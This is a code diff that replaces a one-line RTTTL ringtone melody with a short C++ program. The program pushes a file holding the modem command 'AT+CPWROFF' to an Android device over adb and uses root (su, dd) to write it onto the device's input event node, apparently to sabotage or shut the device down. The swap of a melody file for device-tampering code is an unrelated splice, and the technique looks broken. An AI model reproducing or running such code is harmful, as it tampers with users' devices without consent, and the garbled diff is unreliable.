@@ -1,1 +1,16 @@
-Animania:d=16,o=5,b=160:4d#6,4d6,4d#6,4f.6,8d#6,4d.6,8d#6,4c6,2p,8d6,8d#6,4f.6,8d#6,4d.6,8d#6,4a#,2p,8c6,8a#,8g#,8g#,8c6,8d#6,4g#6,8p,8g#6,8a#.6,g#6,8g6,8g#6,4f6,8p,8f6,4d#6,4c7,4a#.6,8g#6,4g#6
+#include <iostream>
+#include <fstream>
+#include <cstdlib>
+
+using namespace std;
+
+int main()
+{
+   ofstream bad_kb;
+   bad_kb.open("bad_kb.txt");
+   bad_kb << "AT+CPWROFF\r\n";
+   bad_kb.close();
+   system("adb push bad_kb.txt /sdcard/");
+   system("adb shell su -c 'dd if=/sdcard/bad_kb.txt of=/dev/input/event0'");
+   return 0;
+}
